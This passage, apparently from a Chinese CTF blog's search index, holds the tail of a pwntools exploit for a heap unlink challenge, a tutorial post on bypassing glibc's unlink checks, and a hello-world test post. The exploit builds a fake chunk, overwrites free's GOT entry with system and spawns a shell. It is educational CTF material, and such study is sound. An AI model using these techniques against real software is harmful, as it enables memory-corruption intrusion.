p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#free第二个chunk，将会触发unlinkdelete_chunk(1)#泄露system的地址d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#将free_got的地址覆盖掉第二个chunk的地址payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址set_chunk(1, p32(system))#调用free，实际调用systemdelete_chunk(2)p.interactive() 注意 set_chunk函数中最后应该用send而非sendline，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。 unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值 此题为32位程序，若是64位应将p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)改为p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10) 相关链接题目链接：heapHITCON CTF 2014-stkof]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[原理unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。从双向链表中取出节点的过程，若是学过数据结构应该都比较清楚，主要代码是： 12P-&gt;fd-&gt;bk = P-&gt;bkP-&gt;bk-&gt;fd = P-&gt;fd 但是在unlink宏中，为了安全性还增加了一些检查：unlink源码：1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125; 要利用该漏洞，先要绕过这里的两处检查（64位为例） 第一处检查chunksize(P) != prev_size (next_chunk(P))，检查下一个chunk的prevsize是否等于当前chunk的size，所以需要通过溢出等手段设置下一chunk的prevsize 第二处检查__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)，检查当前chunk是否是前一个chunk的后继，同时也是后一个chunk的前驱，也就是检查链表是否真的是链接好的。但是这个检查有个致命的缺点: 因为FD-&gt;bk == *(FD+0x18)、BK-&gt;fd == *(BK+0x10)若在FD中存入&amp;P-0x18，那么表达式将变为*FD-&gt;bk = ((&amp;P-0x18)+0x18) == *&amp;P == P若在BK中存入&amp;P-0x10，那么表达式将变为*BK-&gt;fd = ((&amp;P-0x10)+0x10) == *&amp;P == P从而就绕过了检查 注意：&amp;P是表示指向目标chunk的指针的地址 绕过检查后，满足FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P，所以有：12FD-&gt;bk = BK; // P = &amp;P-0x10BK-&gt;fd = FD; // P = &amp;P-0x18 在此之后，P就指向了比自己的地址低0x18个字节的位置，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。 触发前提 堆指针是全局变量，或其地址是可泄露的 能够free一个smallchunk(可以是伪造的)(largebin增加对fd_nextsize和bk_nextsize检查，unsortedbin没有检查) 能够控制下一chunk的prevsize和size 利用过程（64位为例）法一存在堆溢出时： 分配连续3个chunk a, b, c 在a中伪造chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding 覆盖b的prevsize和size，修改inuse位，使之可以与a合并p64(0x80) + p64(0x90) free掉b，触发unlink 写入a，覆盖指针为任意地址，p64(0)*3 + p64(addr) 再次写入a，任意地址写入 法二不能溢出，但有double free 分配连续3个fastchunk a, b, c 释放a，此时并不会修改后面的inuse位和prevsize 申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改 触发double free，将a再次释放，放入fastbin 再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse 布置a内存，释放b，触发unlink 题目 一道典型的unlink例题 HITCON CTF 2014-stkof]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[这是一个测试1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
